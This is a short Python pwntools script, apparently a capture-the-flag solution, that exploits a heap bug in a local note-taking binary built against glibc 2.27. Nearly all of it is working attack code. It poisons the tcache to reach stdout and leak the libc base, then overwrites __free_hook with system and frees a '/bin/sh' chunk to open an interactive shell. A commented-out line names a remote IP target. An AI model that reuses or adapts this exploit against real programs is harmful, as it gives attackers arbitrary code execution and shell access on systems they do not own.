from pwn import *
def cmd(c):
	p.sendlineafter(">\n",str(c))
def CMD(c):
	p.sendlineafter(">",str(c))
def add(c="A"):
	cmd(1)
	p.sendafter("ote>\n",c)
def ADD(c="A"):
	CMD(1)
	p.sendafter("ote>",c)
def EDIT(idx,lenth,c):
	CMD(3)
	p.sendlineafter("?\n",str(idx))
	p.sendlineafter(">",str(lenth))
	p.sendafter(">",c)
def FREE(idx):
	CMD(2)
	p.sendlineafter("?\n",str(idx))
def edit(idx,lenth,c):
	cmd(3)
	p.sendlineafter(">",str(idx))
	p.sendlineafter(">",str(lenth))
	p.sendafter(">\n",c)
def free(idx):
	cmd(2)
	p.sendlineafter(">",str(idx))
p=process("./main")#,env={"LD_PRELOAD":"./libc-2.27.so"})
#context.log_level='debug'
#libc=ELF("./main").libc
#p=remote("10.21.13.190",2602)
for x in xrange(8):
	add()
for x in xrange(6):
	free(7-x)
free(0)
free(1)
add()#0
add()#1
gdb.attach(p)
edit(0,0x148,'\x00'*0x138+p64(0x141)+'\x60\x07\xdd')
edit(1,0x148,'\x00'*0x138+p64(0x141)+"\xa0\x73")
try:
	add()#2
	add()#3
	add(p64(0xfbad1800)+'\x00'*0x18+'\x00')#4
	p.read(8)
	base=u64(p.read(8))-(0x7ffff7dd18b0-0x7ffff79e4000)
	log.warning(hex(base))
	FREE(1)
	FREE(3)
	ADD()#1
	EDIT(1,0x148,'\x00'*0x138+p64(0x141)+p64(0x3ed8e8+base))
	ADD("/bin/sh")#3
	ADD(p64(0x4f440+base))
	FREE(3)
	p.interactive()
except:
	p.close()


# 1/16*4096 timuchudetailanle...
